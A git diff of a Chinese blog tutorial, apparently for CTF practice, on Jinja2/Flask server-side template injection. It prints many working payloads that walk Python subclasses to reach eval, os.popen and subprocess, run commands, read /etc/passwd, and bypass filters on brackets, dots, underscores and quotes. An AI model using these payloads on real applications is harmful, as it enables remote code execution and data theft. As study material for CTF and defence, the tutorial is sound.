-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220723235742273.png"
-        title="image-20220723235742273" /></p>
+</div><p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220723235742273.png" title="image-20220723235742273" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220723235742273.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220723235742273.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220723235742273.png, https://tuchuang.huamang.xyz/img/image-20220723235742273.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220723235742273.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220723235742273.png">
+    </a></p>
 <p>当然这只是其中一个方法，在获取到了object后，能走的路非常多，获取object的方法也很多</p>
 <p>比如<code>__mro__</code>，这个就可以用来获取基类，他会返回一个类的调用顺序，其中就必定会有object</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220724001442014.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220724001442014.png, https://tuchuang.huamang.xyz/img/image-20220724001442014.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220724001442014.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220724001442014.png"
-        title="image-20220724001442014" /></p>
-<h1 id="利用">利用</h1>
-<h2 id="找利用链">找利用链</h2>
-<p>这里我们可以用脚本来跑出我们想要的东西</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220724001442014.png" title="image-20220724001442014" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220724001442014.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220724001442014.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220724001442014.png, https://tuchuang.huamang.xyz/img/image-20220724001442014.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220724001442014.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220724001442014.png">
+    </a></p>
+<h1 id="利用" class="headerLink">
+    <a href="#%e5%88%a9%e7%94%a8" class="header-mark"></a>利用</h1><h2 id="找利用链" class="headerLink">
+    <a href="#%e6%89%be%e5%88%a9%e7%94%a8%e9%93%be" class="header-mark"></a>找利用链</h2><p>这里我们可以用脚本来跑出我们想要的东西</p>
 <p>本地</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -532,9 +600,9 @@ __builtins__  是一个包含了大量内置函数的一个模块
 剩下的以此类推
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="rce">RCE</h2>
-<h3 id="eval">eval</h3>
-<p>首先，题目环境的不一样可能需要我们去找环境中含有内建函数 eval 的子类的索引号</p>
+</div><h2 id="rce" class="headerLink">
+    <a href="#rce" class="header-mark"></a>RCE</h2><h3 id="eval" class="headerLink">
+    <a href="#eval" class="header-mark"></a>eval</h3><p>首先，题目环境的不一样可能需要我们去找环境中含有内建函数 eval 的子类的索引号</p>
 <p>这里脚本的原理就是通过遍历<code>__subclasses__</code>，然后再通过<code>.__init__.__globals__['__builtins__']</code>里面找是否存在eval函数字眼</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -578,8 +646,8 @@ __builtins__  是一个包含了大量内置函数的一个模块
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{{&#39;&#39;.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;)}}
 </code></pre></td></tr></table>
 </div>
-</div><h3 id="os模块">os模块</h3>
-<p>Python的 os 模块中有system和popen这两个函数可用来执行命令，system没有回显，popen有回显</p>
+</div><h3 id="os模块" class="headerLink">
+    <a href="#os%e6%a8%a1%e5%9d%97" class="header-mark"></a>os模块</h3><p>Python的 os 模块中有system和popen这两个函数可用来执行命令，system没有回显，popen有回显</p>
 <p>而找os模块的方法就和上面的差不多，可以编写脚本，遍历subclass的类里的<code>__init__.__globals__</code></p>
 <p>查找里面有没有导入os模块</p>
 <div class="highlight"><div class="chroma">
@@ -613,8 +681,8 @@ __builtins__  是一个包含了大量内置函数的一个模块
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{{&#39;&#39;.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__[&#39;os&#39;].popen(&#39;ls /&#39;).read()}}
 </code></pre></td></tr></table>
 </div>
-</div><h3 id="subprocesspopen类">subprocess.popen类</h3>
-<p>subprocess 意在替代其他几个老的模块或者函数，比如：<code>os.system</code>、<code>os.popen</code> 等函数。</p>
+</div><h3 id="subprocesspopen类" class="headerLink">
+    <a href="#subprocesspopen%e7%b1%bb" class="header-mark"></a>subprocess.popen类</h3><p>subprocess 意在替代其他几个老的模块或者函数，比如：<code>os.system</code>、<code>os.popen</code> 等函数。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -646,8 +714,8 @@ __builtins__  是一个包含了大量内置函数的一个模块
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">{{[]</span><span class="o">.</span><span class="no">__class__</span><span class="o">.</span><span class="nx">__base__</span><span class="o">.</span><span class="nx">__subclasses__</span><span class="p">()[</span><span class="mi">245</span><span class="p">](</span><span class="s1">&#39;ls /&#39;</span><span class="p">,</span><span class="nx">shell</span><span class="o">=</span><span class="k">True</span><span class="p">,</span><span class="nx">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="nx">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nx">strip</span><span class="p">()}}</span>
 </code></pre></td></tr></table>
 </div>
-</div><h3 id="linecache-函数">linecache 函数</h3>
-<p>linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块</p>
+</div><h3 id="linecache-函数" class="headerLink">
+    <a href="#linecache-%e5%87%bd%e6%95%b0" class="header-mark"></a>linecache 函数</h3><p>linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -679,8 +747,8 @@ __builtins__  是一个包含了大量内置函数的一个模块
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__[&#39;linecache&#39;][&#39;os&#39;].popen(&#39;ls /&#39;).read()}}{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen(&#39;ls /&#39;).read()}}
 </code></pre></td></tr></table>
 </div>
-</div><h3 id="lipsum">lipsum</h3>
-<p>前段时间兴起的一条路，非常方便的可以进行rce</p>
+</div><h3 id="lipsum" class="headerLink">
+    <a href="#lipsum" class="header-mark"></a>lipsum</h3><p>前段时间兴起的一条路，非常方便的可以进行rce</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -693,8 +761,8 @@ __builtins__  是一个包含了大量内置函数的一个模块
 <span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;</span><span class="p">)}}</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="文件读取">文件读取</h2>
-<p>如果实在没有命令执行，那就看看有没有文件读取的操作</p>
+</div><h2 id="文件读取" class="headerLink">
+    <a href="#%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96" class="header-mark"></a>文件读取</h2><p>如果实在没有命令执行，那就看看有没有文件读取的操作</p>
 <p>python2中file类可以直接用来读取文件</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -736,28 +804,28 @@ for i in range(500):
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{{().__class__.__bases__[0].__subclasses__()[79][&#34;get_data&#34;](0, &#34;/etc/passwd&#34;)}}
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="bypass">Bypass</h1>
-<h2 id="heading">{{</h2>
-<p>绕过方法</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220919090132318.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220919090132318.png, https://tuchuang.huamang.xyz/img/image-20220919090132318.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220919090132318.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220919090132318.png"
-        title="image-20220919090132318" /></p>
+</div><h1 id="bypass" class="headerLink">
+    <a href="#bypass" class="header-mark"></a>Bypass</h1><h2 id="heading" class="headerLink">
+    <a href="#heading" class="header-mark"></a>{{</h2><p>绕过方法</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220919090132318.png" title="image-20220919090132318" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220919090132318.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220919090132318.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220919090132318.png, https://tuchuang.huamang.xyz/img/image-20220919090132318.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220919090132318.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220919090132318.png">
+    </a></p>
 <p>（直接写给gitpage整报错了）</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220919090231444.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220919090231444.png, https://tuchuang.huamang.xyz/img/image-20220919090231444.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220919090231444.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220919090231444.png"
-        title="image-20220919090231444" /></p>
-<h2 id="heading-1">[]</h2>
-<p>过滤了[]后，我们payload有几个地方就过不去了</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220919090231444.png" title="image-20220919090231444" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220919090231444.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220919090231444.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220919090231444.png, https://tuchuang.huamang.xyz/img/image-20220919090231444.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220919090231444.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220919090231444.png">
+    </a></p>
+<h2 id="heading-1" class="headerLink">
+    <a href="#heading-1" class="header-mark"></a>[]</h2><p>过滤了[]后，我们payload有几个地方就过不去了</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -766,8 +834,8 @@ for i in range(500):
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()}}
 </code></pre></td></tr></table>
 </div>
-</div><h3 id="getitem">getitem</h3>
-<p>那么这里就可以利用函数<code>getitem()</code>进行获取列表元素，payload就变成这样</p>
+</div><h3 id="getitem" class="headerLink">
+    <a href="#getitem" class="header-mark"></a>getitem</h3><p>那么这里就可以利用函数<code>getitem()</code>进行获取列表元素，payload就变成这样</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -776,16 +844,16 @@ for i in range(500):
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()}}
 </code></pre></td></tr></table>
 </div>
-</div><p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220724000650617.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220724000650617.png, https://tuchuang.huamang.xyz/img/image-20220724000650617.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220724000650617.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220724000650617.png"
-        title="image-20220724000650617" /></p>
-<h3 id="pop">pop</h3>
-<p>最好不要用pop()，因为pop()会删除相应位置的值</p>
+</div><p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220724000650617.png" title="image-20220724000650617" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220724000650617.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220724000650617.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220724000650617.png, https://tuchuang.huamang.xyz/img/image-20220724000650617.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220724000650617.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220724000650617.png">
+    </a></p>
+<h3 id="pop" class="headerLink">
+    <a href="#pop" class="header-mark"></a>pop</h3><p>最好不要用pop()，因为pop()会删除相应位置的值</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -798,8 +866,8 @@ for i in range(500):
 {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.pop(&#39;__builtins__&#39;).pop(&#39;eval&#39;)(&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;)}}// 指定字典属性
 </code></pre></td></tr></table>
 </div>
-</div><h3 id="字典">字典</h3>
-<p>我们知道访问字典里的值有两种方法，一种是把相应的键放入熟悉的方括号 <code>[]</code> 里来访问，一种就是用点 <code>.</code> 来访问。所以，当方括号 <code>[]</code> 被过滤之后，我们还可以用点 <code>.</code> 的方式来访问，如下示例</p>
+</div><h3 id="字典" class="headerLink">
+    <a href="#%e5%ad%97%e5%85%b8" class="header-mark"></a>字典</h3><p>我们知道访问字典里的值有两种方法，一种是把相应的键放入熟悉的方括号 <code>[]</code> 里来访问，一种就是用点 <code>.</code> 来访问。所以，当方括号 <code>[]</code> 被过滤之后，我们还可以用点 <code>.</code> 的方式来访问，如下示例</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -825,8 +893,8 @@ for i in range(500):
 <span class="p">{{()</span><span class="o">.</span><span class="no">__class__</span><span class="o">.</span><span class="nx">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nx">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="nx">__init__</span><span class="o">.</span><span class="nx">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s1">&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span><span class="p">)}}</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="_">_</h2>
-<p>利用request对象绕过</p>
+</div><h2 id="_" class="headerLink">
+    <a href="#_" class="header-mark"></a>_</h2><p>利用request对象绕过</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -848,19 +916,19 @@ for i in range(500):
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">{{()</span><span class="o">.</span><span class="no">__class__</span><span class="o">.</span><span class="nx">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nx">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="nx">pop</span><span class="p">(</span><span class="mi">40</span><span class="p">)(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()}}{{()</span><span class="o">.</span><span class="no">__class__</span><span class="o">.</span><span class="nx">__base__</span><span class="o">.</span><span class="nx">__subclasses__</span><span class="p">()[</span><span class="mi">77</span><span class="p">]</span><span class="o">.</span><span class="nx">__init__</span><span class="o">.</span><span class="nx">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="nx">popen</span><span class="p">(</span><span class="s1">&#39;ls /&#39;</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()}}</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="引号">引号'</h2>
-<h3 id="利用chr绕过">利用chr()绕过</h3>
-<p>先获取chr()函数，赋值给chr，后面再拼接成一个字符串</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220919091230127.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220919091230127.png, https://tuchuang.huamang.xyz/img/image-20220919091230127.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220919091230127.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220919091230127.png"
-        title="image-20220919091230127" /></p>
-<h3 id="利用request对象绕过">利用request对象绕过</h3>
-<p>示例：</p>
+</div><h2 id="引号" class="headerLink">
+    <a href="#%e5%bc%95%e5%8f%b7" class="header-mark"></a>引号'</h2><h3 id="利用chr绕过" class="headerLink">
+    <a href="#%e5%88%a9%e7%94%a8chr%e7%bb%95%e8%bf%87" class="header-mark"></a>利用chr()绕过</h3><p>先获取chr()函数，赋值给chr，后面再拼接成一个字符串</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220919091230127.png" title="image-20220919091230127" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220919091230127.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220919091230127.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220919091230127.png, https://tuchuang.huamang.xyz/img/image-20220919091230127.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220919091230127.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220919091230127.png">
+    </a></p>
+<h3 id="利用request对象绕过" class="headerLink">
+    <a href="#%e5%88%a9%e7%94%a8request%e5%af%b9%e8%b1%a1%e7%bb%95%e8%bf%87" class="header-mark"></a>利用request对象绕过</h3><p>示例：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -886,9 +954,9 @@ for i in range(500):
 </code></pre></td></tr></table>
 </div>
 </div><p>如果过滤了args，可以将其中的request.args改为request.values，POST和GET两种方法传递的数据request.values都可以接收。</p>
-<h2 id="点">点.</h2>
-<h3 id="利用-attr-绕过适用于flask">利用 <code>|attr()</code> 绕过（适用于flask）</h3>
-<p>如果 <code>.</code> 也被过滤，且目标是JinJa2（flask）的话，可以使用原生JinJa2函数<code>attr()</code>，即：</p>
+<h2 id="点" class="headerLink">
+    <a href="#%e7%82%b9" class="header-mark"></a>点.</h2><h3 id="利用-attr-绕过适用于flask" class="headerLink">
+    <a href="#%e5%88%a9%e7%94%a8-attr-%e7%bb%95%e8%bf%87%e9%80%82%e7%94%a8%e4%ba%8eflask" class="header-mark"></a>利用 <code>|attr()</code> 绕过（适用于flask）</h3><p>如果 <code>.</code> 也被过滤，且目标是JinJa2（flask）的话，可以使用原生JinJa2函数<code>attr()</code>，即：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -912,8 +980,8 @@ for i in range(500):
 <span class="p">{{()</span><span class="o">.</span><span class="no">__class__</span><span class="o">.</span><span class="nx">__base__</span><span class="o">.</span><span class="nx">__subclasses__</span><span class="p">()[</span><span class="mi">77</span><span class="p">]</span><span class="o">.</span><span class="nx">__init__</span><span class="o">.</span><span class="nx">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="nx">popen</span><span class="p">(</span><span class="s1">&#39;ls /&#39;</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()}}</span>
 </code></pre></td></tr></table>
 </div>
-</div><h3 id="利用中括号-绕过">利用中括号[ ]绕过</h3>
-<p>如下示例：</p>
+</div><h3 id="利用中括号-绕过" class="headerLink">
+    <a href="#%e5%88%a9%e7%94%a8%e4%b8%ad%e6%8b%ac%e5%8f%b7-%e7%bb%95%e8%bf%87" class="header-mark"></a>利用中括号[ ]绕过</h3><p>如下示例：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -930,9 +998,9 @@ for i in range(500):
 <span class="p">{{()</span><span class="o">.</span><span class="no">__class__</span><span class="o">.</span><span class="nx">__bases__</span><span class="o">.</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nx">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="p">[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="nx">__init__</span><span class="p">[</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="k">eval</span><span class="p">(</span><span class="s1">&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span><span class="p">)}}</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="组合绕过">组合绕过</h2>
-<h3 id="--">. + []</h3>
-<div class="highlight"><div class="chroma">
+</div><h2 id="组合绕过" class="headerLink">
+    <a href="#%e7%bb%84%e5%90%88%e7%bb%95%e8%bf%87" class="header-mark"></a>组合绕过</h2><h3 id="--" class="headerLink">
+    <a href="#--" class="header-mark"></a>. + []</h3><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
@@ -940,8 +1008,8 @@ for i in range(500):
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="p">{{()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;__class__&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;__base__&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;__subclasses__&#34;</span><span class="p">)()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;__getitem__&#34;</span><span class="p">)(</span><span class="mi">77</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;__init__&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;__globals__&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;__getitem__&#34;</span><span class="p">)(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;popen&#34;</span><span class="p">)(</span><span class="s2">&#34;ls&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;read&#34;</span><span class="p">)()}}</span>
 </code></pre></td></tr></table>
 </div>
-</div><h3 id="__-">__ +.+[]</h3>
-<p>原payload</p>
+</div><h3 id="__-" class="headerLink">
+    <a href="#__-" class="header-mark"></a>__ +.+[]</h3><p>原payload</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -961,8 +1029,8 @@ for i in range(500):
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">{{()</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x1</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x2</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x3</span><span class="p">)()</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x4</span><span class="p">)(</span><span class="mi">77</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x5</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x6</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x4</span><span class="p">)(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x7</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x4</span><span class="p">)(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x8</span><span class="p">)(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">x9</span><span class="p">)}}</span><span class="o">&amp;</span><span class="nx">x1</span><span class="o">=</span><span class="no">__class__</span><span class="o">&amp;</span><span class="nx">x2</span><span class="o">=</span><span class="nx">__base__</span><span class="o">&amp;</span><span class="nx">x3</span><span class="o">=</span><span class="nx">__subclasses__</span><span class="o">&amp;</span><span class="nx">x4</span><span class="o">=</span><span class="nx">__getitem__</span><span class="o">&amp;</span><span class="nx">x5</span><span class="o">=</span><span class="nx">__init__</span><span class="o">&amp;</span><span class="nx">x6</span><span class="o">=</span><span class="nx">__globals__</span><span class="o">&amp;</span><span class="nx">x7</span><span class="o">=</span><span class="nx">__builtins__</span><span class="o">&amp;</span><span class="nx">x8</span><span class="o">=</span><span class="k">eval</span><span class="o">&amp;</span><span class="nx">x9</span><span class="o">=</span><span class="nx">__import__</span><span class="p">(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">.</span><span class="nx">popen</span><span class="p">(</span><span class="s1">&#39;ls /&#39;</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()</span>
 </code></pre></td></tr></table>
 </div>
-</div><h3 id="heading-2">&lsquo;+&quot;</h3>
-<div class="highlight"><div class="chroma">
+</div><h3 id="heading-2" class="headerLink">
+    <a href="#heading-2" class="header-mark"></a>&lsquo;+&quot;</h3><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
@@ -970,8 +1038,8 @@ for i in range(500):
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">{{()</span><span class="o">.</span><span class="no">__class__</span><span class="o">.</span><span class="nx">__bases__</span><span class="o">.</span><span class="nx">__getitem__</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="nx">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="nx">pop</span><span class="p">(</span><span class="mi">40</span><span class="p">)(</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">path</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()</span> <span class="p">}}</span><span class="o">&amp;</span><span class="nx">path</span><span class="o">=/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">passwd</span>
 </code></pre></td></tr></table>
 </div>
-</div><h3 id="_-1">_+'+&quot;</h3>
-<div class="highlight"><div class="chroma">
+</div><h3 id="_-1" class="headerLink">
+    <a href="#_-1" class="header-mark"></a>_+'+&quot;</h3><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
@@ -979,8 +1047,8 @@ for i in range(500):
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="p">[</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">class</span><span class="p">][</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">mro</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">subclasses</span><span class="o">.</span><span class="nx">read</span><span class="p">()</span> <span class="p">}}</span><span class="o">&amp;</span><span class="nx">class</span><span class="o">=</span><span class="nx">_class__</span><span class="o">&amp;</span><span class="nx">mro</span><span class="o">=</span><span class="nx">_mro__</span><span 